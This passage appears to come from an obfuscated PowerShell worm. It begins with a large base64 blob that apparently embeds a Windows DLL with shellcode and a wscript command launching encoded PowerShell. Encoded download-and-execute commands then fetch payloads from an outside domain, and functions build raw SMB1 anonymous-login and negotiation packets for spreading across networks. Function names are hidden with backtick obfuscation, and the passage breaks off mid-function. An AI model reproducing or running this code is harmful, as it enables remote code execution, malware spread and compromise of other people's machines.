/ZuW/Pz8npeY+JuRnpCX+fmfn/35k5KXm/yWl/iXkJb9l56QkZuZ/Pz4n5b9mZeT+JKTmJL9kpb4lpeW/P34+ZH5l5Cfkfib+Z+QkpiWm5afk5KQkP2XmPiR+JeQn/n9kpebmZGQ/P2ekpuS/JuT/Z6Q+ZefmJGfnv38l5mYlviXkfmQkpH8/JiSmJH5/J+W+JiYm5/5k5v4npGW/ZuR+Pz5npeYn/mWm/2SkPmW/JeYkpaR+ZiWlvmWl5iTl/ye/J/9mZ6enpu
Ql5GZkpD8+f2fnpf9/JH9/Jeb/ZaXnpGQm5n9mJmQl5uTn/mQkpeR/JL4k/z5n5/4+ZiZkvz4kPiXk5f4+J+SnpaZlpKY+Zf9npaelpGYkPme/ZmXlpP9/J6Wn/z4k5aW+ZGZlpmQlpmR+Z6fmZORkJ+ek5ue/fj8+f2SlpaY+Zefkv2bkZj4k5eX+Zf9mJOQkJb9n5/9kZOem/yS+JmQ/JuWlpeekZuSnp6emZeS/Z6Ymfj4mJOYlp+Wk5mQl5iW+fiXk/mYm5
b8+fn8mZuZl/mRl5/8/ZH9nvmQ/PmbkJOYl/yXk/me/Pj8+ZL9mJL5+JOSkpH9np6ekZmW/Z+Rn5mTl5OSmPj5+ZKemZeflpKQmZv4k/j4/JaXn5ObkfmQ+Zv8l5KQmJOWkP2XkJmWl/ye+JaYk/n8/f2Tnpv9l5+X+ZiX+ZH9/JOYk5b5+JCT/f34/PiQ/JaX/JGYn5KTnpuXkp78n/ye+JmQkJeQm5OT/JKYl/yYnpKfnpGbkZv4kpD8kZf9mJOS/Pn8SIPk8
OjAAAAAQVFBUFJRVkgx0mVIi1JgSItSGEiLUiBIi3JQSA+3SkpNMclIMcCsPGF8AiwgQcHJDUEBweLtUkFRSItSIItCPEgB0IuAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulX////XUi6
AQAAAAAAAABIjY0BAQAAQboxi2+H/9W74B0qCkG6ppW9nf/VSIPEKDwGfAqA++B1BbtHE3JvagBZQYna/9Vtc2h0YSB2YnNjcmlwdDpjcmVhdGVvYmplY3QoIndzY3JpcHQuc2hlbGwiKS5ydW4oInBvd2Vyc2hlbGwgLW5vcCAtZSBKQUJzQUdZQVBRQWtBR1VBYmdCMkFEb0FkQUJ0QUhBQUt3QW5BRndBYXdCa0FHd0Fjd0E1QURJQWFnQnpBR29BY1FCekF
EQUFMZ0IxQUhNQVlnQW5BRHNBYVFCbUFDZ0FJUUFvQUZRQVpRQnpBSFFBTFFCUUFHRUFkQUJvQUNBQUpBQnNBR1lBS1FBcEFIc0FTUUJGQUZnQUtBQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQk9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFDa0FMZ0JFQUc4QWR3QnVBR3dBYndCaEFHUUFVd0IwQU
hJQWFRQnVBR2NBS0FBbkFHZ0FkQUIwQUhBQU9nQXZBQzhBZEFBdUFIb0FaUUJ5QURJQUxnQmpBRzhBYlFBdkFIVUFjd0JpQUM0QWFnQnpBSEFBSndBcEFEc0FiZ0JsQUhjQUxRQnBBSFFBWlFCdEFDQUFKQUJzQUdZQUlBQXRBSFFBZVFCd0FHVUFJQUJtQUdrQWJBQmxBSDBBIiwwKSh3aW5kb3cuY2xvc2UpANgwrGsAAAAAAAAAAAAAAAD//////////wAAA
AAAAAAAAgAAAAAAAAAAAAAAAAAAADKi3y2ZKwAAAAAAAAAAAADNXSDSZtT//wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXFNlYXJjaFByb3RvY29sSG9zdC5leGUAcy0xLTUtMTgAc3Bvb2xzdi5leGUAa29wbXFjSUgAcnVuZGxsMzIuZXhlAAAAAAAAAAAAAAAAAAAAhaxrAAAAACCArGsAAAAAsB2sawAAAAAAAAAAAAAAAE1pbm
d3LXc2NCBydW50aW1lIGZhaWx1cmU6CgAAAAAAQWRkcmVzcyAlcCBoYXMgbm8gaW1hZ2Utc2VjdGlvbgAgIFZpcnR1YWxRdWVyeSBmYWlsZWQgZm9yICVkIGJ5dGVzIGF0IGFkZHJlc3MgJXAAAAAAAAAAACAgVmlydHVhbFByb3RlY3QgZmFpbGVkIHdpdGggY29kZSAweCV4AAAgIFVua25vd24gcHNldWRvIHJlbG9jYXRpb24gcHJvdG9jb2wgdmVyc2lvb
iAlZC4KAAAAAAAAACAgVW5rbm93biBwc2V1ZG8gcmVsb2NhdGlvbiBiaXQgc2l6ZSAlZC4KAAAAAAAAAAAAAAAAAAAALnBkYXRhAAAAAAAAAAAAACBIrGsAAAAAAAAAAAAAAADAMKxrAAAAAAAAAAAAAAAAIFWsawAAAAAAAAAAAAAAACBVrGsAAAAAAAAAAAAAAABgUKxrAAAAAAAAAAAAAAAAAACsawAAAAAAAAAAAAAAAEikrGsAAAAAAAAAAAAAAAAUSKxr
AAAAAAAAAAAAAAAACImsawAAAAAAAAAAAAAAAACJrGsAAAAAAAAAAAAAAADwiKxrAAAAAAAAAAAAAAAA+IisawAAAAAAAAAAAAAAAACwrGsAAAAAAAAAAAAAAAAIsKxrAAAAAAAAAAAAAAAAELCsawAAAAAAAAAAAAAAACCwrGsAAAAAAAAAAAAAAACwhaxrAAAAAAAAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDU
uMy4xIDIwMTUxMjA3AAAAAAAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNjAyMTEAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAAAAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDUuMy4xIDIwMT
UxMjA3AAAAAAAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAAAAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAA
AAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNTEyMDcAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAAAAAAEdDQzogKEdOVSkgNS4zLjEgMjAxNjAyMTEAAAAAAAAAR0NDOiAoR05VKSA1LjMuMSAyMDE1MTIwNwAAAAAAAABHQ0M6IChHTlUpIDUuMy4xIDIwMTUxMjA3AAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAABAAAE0QAAAAcAAAUBAAAIsSAAAIcAAAkBIAAMkTAAAccAAA0BMAAB8UAAAscAAAIBQAAFcUAAA0cAAAVxQAALAUAABAcAAAsBQAALQVAABIcAAAtBUAADcWAABYcAAANxYAAMYWAABkcAAAxhYAAMIXAAB0cAAAwhcAAOwZAACEcAAA7BkAAAMaAACUcAAAEBoAALcaAACccAAAwBoAANkaAACkcAAA4BoAABUbAACscAAAIB
sAAHUbAAC0cAAAgBsAAJwbAADAcAAAoBsAAHYcAADEcAAAgBwAAHsdAADUcAAAgB0AAK8dAADkcAAAsB0AABkeAADscAAAIB4AACMeAAD4cAAAMB4AADQeAAD8cAAAQB4AAEQeAAAAcQAAUB4AALEeAAAEcQAAwB4AAB8gAAAQcQAAICAAABkjAAAkcQAAICMAALgkAAA8cQAAwCQAAKwlAABEcQAAsCUAAGEnAABUcQAAcCcAANonAABccQAA4CcAAFooAABsc
QAAYCgAAPwoAAB4cQAAACkAANopAACAcQAA4CkAAP8pAACIcQAAACoAABIqAACMcQAAICoAAGUqAACQcQAAcCoAAA4rAACUcQAAECsAAKsrAACgcQAAsCsAAOorAACocQAA8CsAAHssAACwcQAAgCwAALYsAAC4cQAAwCwAAFEtAADAcQAAYC0AACouAADIcQAAMC4AADMuAADQcQAAgC4AAIYuAADUcQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEFAgAFMgEwAQwHAAxCCDAHYAZwBVAEwALQAAABCgYACjIGMAVgBHADUALAAQQBAASCAAABBgMABkICMAFgAAABBQIABTIBcAEIBQAIogQwA2ACcAFQAAABBwQAB1IDMAJgAXABCwYACwErAAQwA2ACcAFQAQoFAAoBKAADMAJgAXAAAAELBgALAbsABDADYAJwAVABBAEABEIAAAEFA
gAFUgEwAQQBAARCAAABBAEABEIAAAEGAwAGQgIwAWAAAAEAAAABCgYACnIGMAVgBHADUALAAQoFBQrSBgMDMAJgAVAAAAEEAQAEQgAAAQYDAAZCAjABYAAAAQAAAAEAAAABAAAAAQYDAAZiAjABYAAAAQwHAAyiCDAHYAZwBVAEwALQAAABEQkFEbINAwowCWAIcAfABdAD4AFQAAABBAEABEIAAAEKBgAKMgYwBWAEcANQAsABBQIABTIBMAEIBQAIQgQwA2AC
cAFQAAABBwQABzIDMAJgAXABBQIABTIBMAEFAgAFMgEwAQAAAAEAAAABAAAAAQcEAAcyAzACYAFwAQQBAARCAAABBAEABEIAAAEEAQAEQgAAAQQBAARCAAABBAEABEIAAAEEAQAEQgAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACEjA1oAAAAAKJAAAAEAAAABAAAAAQAAADSQAAA4kAAAPJAAAHRlbXAuZGx
sAAAAAOwZAAA+kAAAAABEbGxNYWluQDEyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQoAAAAAAAAAAAAABwqQAAiKIAAJCgAAAAAAAAAAAAACiqAADIogAA6KEAAAAAAAAAAAAAhKoAACCkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCkAAAAAAAA2qQAAAAAAADkpAAAAAAAAPykAAAAAAAACKUAAAAAAAAYpQAAAAAAAC6lAAAAAAAA
AAAAAAAAAABCpQAAAAAAAFClAAAAAAAAYKUAAAAAAABwpQAAAAAAAIylAAAAAAAApKUAAAAAAAC8pQAAAAAAANilAAAAAAAA7KUAAAAAAAACpgAAAAAAABimAAAAAAAAKKYAAAAAAAA+pgAAAAAAAFSmAAAAAAAAZqYAAAAAAACApgAAAAAAAJSmAAAAAAAApKYAAAAAAACwpgAAAAAAAMymAAAAAAAA5KYAAAAAAADypgAAAAAAAP6mAAAAAAAADKcAAAAAAAA
epwAAAAAAAC6nAAAAAAAASKcAAAAAAABYpwAAAAAAAG6nAAAAAAAAgqcAAAAAAACcpwAAAAAAALCnAAAAAAAAxKcAAAAAAADipwAAAAAAAOqnAAAAAAAA/qcAAAAAAAAMqAAAAAAAACioAAAAAAAAOqgAAAAAAABMqAAAAAAAAFyoAAAAAAAAcqgAAAAAAAAAAAAAAAAAAIioAAAAAAAAlqgAAAAAAACkqAAAAAAAALKoAAAAAAAAvqgAAAAAAADGqAAAAAAAAN
CoAAAAAAAA3KgAAAAAAADmqAAAAAAAAO6oAAAAAAAA+KgAAAAAAAAAqQAAAAAAAAqpAAAAAAAAFKkAAAAAAAAeqQAAAAAAACipAAAAAAAAMqkAAAAAAAA8qQAAAAAAAEapAAAAAAAAAAAAAAAAAADApAAAAAAAANqkAAAAAAAA5KQAAAAAAAD8pAAAAAAAAAilAAAAAAAAGKUAAAAAAAAupQAAAAAAAAAAAAAAAAAAQqUAAAAAAABQpQAAAAAAAGClAAAAAAAAc
KUAAAAAAACMpQAAAAAAAKSlAAAAAAAAvKUAAAAAAADYpQAAAAAAAOylAAAAAAAAAqYAAAAAAAAYpgAAAAAAACimAAAAAAAAPqYAAAAAAABUpgAAAAAAAGamAAAAAAAAgKYAAAAAAACUpgAAAAAAAKSmAAAAAAAAsKYAAAAAAADMpgAAAAAAAOSmAAAAAAAA8qYAAAAAAAD+pgAAAAAAAAynAAAAAAAAHqcAAAAAAAAupwAAAAAAAEinAAAAAAAAWKcAAAAAAABu
pwAAAAAAAIKnAAAAAAAAnKcAAAAAAACwpwAAAAAAAMSnAAAAAAAA4qcAAAAAAADqpwAAAAAAAP6nAAAAAAAADKgAAAAAAAAoqAAAAAAAADqoAAAAAAAATKgAAAAAAABcqAAAAAAAAHKoAAAAAAAAAAAAAAAAAACIqAAAAAAAAJaoAAAAAAAApKgAAAAAAACyqAAAAAAAAL6oAAAAAAAAxqgAAAAAAADQqAAAAAAAANyoAAAAAAAA5qgAAAAAAADuqAAAAAAAAPi
oAAAAAAAAAKkAAAAAAAAKqQAAAAAAABSpAAAAAAAAHqkAAAAAAAAoqQAAAAAAADKpAAAAAAAAPKkAAAAAAABGqQAAAAAAAAAAAAAAAAAAcwBDb252ZXJ0U3RyaW5nU2lkVG9TaWRBAAB2AENvcHlTaWQAewBDcmVhdGVQcm9jZXNzQXNVc2VyQQAABwFFcXVhbFNpZAAANgFHZXRMZW5ndGhTaWQAAFoBR2V0VG9rZW5JbmZvcm1hdGlvbgD3AU9wZW5Qcm9jZX
NzVG9rZW4AAFUAQ2xvc2VIYW5kbGUAoABDcmVhdGVNdXRleEEAALoAQ3JlYXRlVGhyZWFkAADDAENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdAAA2ABEZWxldGVDcml0aWNhbFNlY3Rpb24A+ABFbnRlckNyaXRpY2FsU2VjdGlvbgAAbwFGcmVlTGlicmFyeUFuZEV4aXRUaHJlYWQAAM0BR2V0Q3VycmVudFByb2Nlc3MAzgFHZXRDdXJyZW50UHJvY2Vzc0lkA
NIBR2V0Q3VycmVudFRocmVhZElkAAAQAkdldExhc3RFcnJvcgAAIgJHZXRNb2R1bGVGaWxlTmFtZUEAACUCR2V0TW9kdWxlSGFuZGxlRXhBAABbAkdldFByb2Nlc3NIZWFwAACKAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAJgCR2V0VGhyZWFkQ29udGV4dAAApQJHZXRUaWNrQ291bnQAAN4CSGVhcEFsbG9jAPkCSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlv
bgBLA0xlYXZlQ3JpdGljYWxTZWN0aW9uAABXA0xvY2FsQWxsb2MAAFsDTG9jYWxGcmVlAJYDT3BlblByb2Nlc3MAqQNQcm9jZXNzMzJGaXJzdAAAqwNQcm9jZXNzMzJOZXh0ALsDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAAARSZXN1bWVUaHJlYWQAAAEEUnRsQWRkRnVuY3Rpb25UYWJsZQACBFJ0bENhcHR1cmVDb250ZXh0AAkEUnRsTG9va3VwRnVuY3R
pb25FbnRyeQAAEARSdGxWaXJ0dWFsVW53aW5kAACKBFNldFRocmVhZENvbnRleHQAAJ8EU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAKwEU2xlZXAAugRUZXJtaW5hdGVQcm9jZXNzAADBBFRsc0dldFZhbHVlAM4EVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAADnBFZpcnR1YWxBbGxvY0V4AADsBFZpcnR1YWxQcm90ZWN0AADuBFZpcnR1YWxRdWVyeQ
AA9gRXYWl0Rm9yU2luZ2xlT2JqZWN0ACsFV3JpdGVQcm9jZXNzTWVtb3J5AABOAF9fZGxsb25leGl0AFMAX19pb2JfZnVuYwAAeABfYW1zZ19leGl0AAAaAV9pbml0dGVybQCAAV9sb2NrACUCX29uZXhpdACDAl9zdHJpY21wAADEAl91bmxvY2sAfwNhYm9ydACQA2NhbGxvYwAAtwNmcmVlAADCA2Z3cml0ZQAA8ANtYWxsb2MAAPgDbWVtY3B5AAAWBHNpZ
25hbAAAJARzdHJjbXAAACsEc3RybGVuAAAuBHN0cm5jbXAATgR2ZnByaW50ZgAAAAAAoAAAAKAAAACgAAAAoAAAAKAAAACgAAAAoAAAQURWQVBJMzIuZGxsAAAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAA
ABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAABSgAAAUoAAAFKAAAEtFUk5FTDMyLmRsbAAAAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAKKAAACigAAAooAAAbXN2Y3J0LmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEKxrAAAAAAAAAAAAAAAAAAAAAAAAAACwHaxrAAAAAIAdrGsAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCsawAAAABgwKxrAAAAAKyFrGsAAAAAMLCsawAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwAAAAAqAAAAFAAADAAAABQoFigYKCQoaChsKHAodCh4KHwoQCiEKIg
ojCiQKJQomCicKKAopCiALAAABAAAAAYoDCgOKAAAADAAAAQAAAAIKAooDCgOKAA4AAAIAAAABCgQKBwoMCg8KBAoXChoKHQoUCicKKgogDwAAAQAAAAm6C+r+Sv/a8AAAEAgAAAACighKCvoNOg/aAKoSOhRaFToWihuaHUofGhDqI9omOieKKXoq+ixqL2olijYaNuo3ujn6PDo9Cj9KMYpDukSKRrpI6ksaTUpAylUKV3pYSlkaXOpQGnQ6g3rJqsp6y+rMu
s2Kz8rAmtFq0trVKtea2lrcKt1K4AAAAQAQAkAAAAwaLiogajO6NMo2Cjd6OZo5WowajxqB+px6kAAAAgAQBcAAAA2qQopT2lY6UJphqmJKZDpmCmfqaRpqKmrKbEpgKnJKdKp3KnoKdUqIery6vdqxmsSaxurI6sw6zbrPesE60trUWtXa14rbWt0q3qrROuO65jruqvADABACgAAAACoBqgMqDdoLyk8qScpc+uBa8SryevO69Ir2avya//rwBAAQBUAAAAPK
BUoGGgfKCQoKWgr6DEoM6g36DxoHahn6G+oReiRqJkopOiraLdogijKKNXo3WjpKO+o9Oj3aPuo/6jMqRMpGCkcaR9pJykv6RFpgBQAQBgAAAAj6UtpkmmXKZ4poump6a6ptam46b/phunN6dsp5Sn0Kfdp/Kn/KcUqCGoT6iwqMyo36j0qBCpI6k/qVKpbqmKqaapwqneqRSqP6ppqkurnK+8r9qv66/8rwBgAQBMAAAABqAToEGgiqCmoLegwaDOoAWhUqFjo
W2hfqGIoZWhoqHHoR6iO6JOomuieqKsormixqLRot6i/6Ijo0ejIaQGpT2l4aUAcAEAUAAAAI2hx6H6oQyiaqLOovqiCaMho2+jr6Pbo+6jSqR7pKOkzKQspVSleqWgpcil+6VSpn6mkab5pneno6e2p9en3aj9qK2p6qoAAACgAQAcAAAA2aElpESlkqfWqEqqnKvCraavAAAAsAEAEAAAAPihpKOJpAAAAMABAFQAAAAgoFig8KBAoYChuKHwoRCiSKJ4ouii
MKNYo6Cj0KPooxikQKSgpBClUKWgpfClOKaIpsCmEKcop0CnWKe4p+inEKhAqGiomKjgqBCpAOABAAwAAABCq02vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
$rdp_cmd='cmd.exe /c powershell -nop -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAHIAZABwAC4AagBzAHAAJwApAA=='
$rdpo_cmd='cmd.exe /c powershell -nop -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdAAuAHoAZQByADIALgBjAG8AbQAvAHIAZABwAG8ALgBqAHMAcAAnACkA'
$log_url='http://down.ackng.com'



function make_smb1_anonymous_login_packet {
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x00,0x48
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x73
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x0d
$pkt += 0xff
$pkt += 0x00
$pkt += 0x00,0x00
$pkt += 0x00,0xf0
$pkt += 0x02,0x00
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x41,0xc0,0x00,0x00
$pkt += 0x0b,0x00
$pkt += 0x00,0x00
$pkt += 0x6e,0x74,0x00
$pkt += 0x70,0x79,0x73,0x6d,0x62,0x00
return $pkt
}
function smb1_anonymous_login($sock){
$raw_proto = M`A`K`e_Smb1_`ANoNy`mOus`_LO`gin_Pa`C`kET
$sock.Send($raw_proto) | OUT-`NulL
return smb1_Get`_`Res`Po`NsE($sock)
}
function negotiate_proto_request(){
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x00,0x2f
$pkt += 0xFF,0x53,0x4D,0x42
$pkt += 0x72
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
